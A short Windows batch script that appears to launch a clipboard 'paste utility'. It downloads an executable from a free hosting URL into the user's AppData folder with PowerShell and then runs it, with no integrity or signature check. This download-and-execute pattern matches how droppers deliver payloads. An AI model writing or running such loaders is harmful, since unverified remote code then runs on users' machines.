@echo off
setlocal

:: Set the download URL and local path
set "exeUrl=https://pspaste-service.onrender.com/PasteClipboard.exe"
set "localPath=%APPDATA%\PSPaste\PasteClipboard.exe"

:: Create directory if it doesn't exist
if not exist "%APPDATA%\PSPaste" mkdir "%APPDATA%\PSPaste"

:: Download the file if it doesn't exist
if not exist "%localPath%" (
    powershell -Command "(New-Object Net.WebClient).DownloadFile('%exeUrl%', '%localPath%')"
)

:: Execute the paste utility
start "" "%localPath%" 